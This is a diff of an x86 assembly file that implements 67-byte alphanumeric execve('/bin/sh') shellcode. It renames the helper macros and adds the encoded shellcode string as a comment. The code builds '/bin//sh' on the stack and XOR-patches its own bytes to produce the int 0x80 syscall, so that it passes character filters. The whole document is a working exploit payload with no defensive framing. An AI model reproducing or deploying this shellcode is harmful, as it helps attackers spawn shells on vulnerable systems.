@@ -1,36 +1,41 @@
-# /* LLLLYhzeroX5zeroPZRh//shh/binTXRRRPRRQRaH5A0AA1F7QX4J4AsO */ #
-.macro pmov arg1, arg2
+	/* x86 - alphanumeric execve("/bin/sh", NULL, NULL) - 67 bytes */
+# char shellcode[67] =
+#  "LLLLYhzeroX5zeroPZf5NNf5aaRfhshfPhabinDfPTXRRRPRRRQaHf5A01GAjAX4JsO";
+
+####		Alphanumeric Macros		####
+.macro a_mov arg1, arg2
 	push \arg1
 	popl \arg2
 .endm
 
-.macro padd n, reg
-.if \n > 0
+.macro a_add n, reg
+    .if \n > 0
 	inc \reg
-	padd "(\n - 1)" \reg
-.endif
-.if \n < 0
+	a_add "(\n - 1)" \reg
+    .endif
+    .if \n < 0
 	dec \reg
-	padd "(\n + 1)" \reg
-.endif
+	a_add "(\n + 1)" \reg
+    .endif
 .endm
 
-.macro eip_popl reg
-	padd -4, %esp
+.macro a_eip_popl reg
+	a_add -4, %esp
 	popl \reg
 .endm
 
-.macro clear_eax
-	pmov $0x6f72657a, %eax
+.macro a_clear_eax
+	a_mov $0x6f72657a, %eax
 	xorl $0x6f72657a, %eax
 .endm
 
+####			_start			####
 .text
 .globl _start
 _start:
-	eip_popl %ecx			# %ecx -> _start
-	clear_eax			# %eax = 0
-	pmov %eax, %edx			# %edx = 0
+	a_eip_popl %ecx			# %ecx -> _start
+	a_clear_eax			# %eax = 0
+	a_mov %eax, %edx			# %edx = 0
 
 	xorw $0x4e4e, %ax		# %eax = 0x4e4e
 	xorw $0x6161, %ax		# %ax = 0x2f2f = '//'
@@ -43,7 +48,7 @@ push_binsh:
 	incl %esp
 	pushw %ax			# %esp -> "//bin//sh"
 #	incl %esp			# %esp -> "/bin//sh"
-	pmov %esp, %eax			# %eax -> "/bin/sh"
+	a_mov %esp, %eax		# %eax -> "/bin/sh"
 
 fake_pusha:
 	pushl %edx			# %eax
@@ -61,15 +66,14 @@ fake_pusha:
 
 xor_mask:
 	decl %eax			# %eax = -1 = 0xffffffff
-	xorw $0x3041, %ax		# %ax = (0xff, 0xff) ^ (0x41, 0x30) = (0xbe, 0xcf)
+	xorw $0x3041, %ax		# ^ (0x41, 0x30) => %ax = (0xbe, 0xcf)
 
 .set OFFSET, 0x41
 xor_patching:
-	xorl %eax, OFFSET(%edi)		# --> _start + OFFSET = int_0x80_syscall
+	xorl %eax, OFFSET(%edi)		# -> _start + OFFSET = int_0x80_syscall
 
-	pmov $0x41, %eax
+	a_mov $0x41, %eax
 	xorb $0x4a, %al			# %eax = 0x41 ^ 0x4a = 0xb (sys_execve)
 
 int_0x80_syscall:
-	.byte 0x73, 0x4f 		# (0x73, 0x4f) ^ (0xbe, 0xcf) = (0xcd, 0x80)
-
+	.byte 0x73, 0x4f 		# ^ (0xbe, 0xcf) = (0xcd, 0x80)
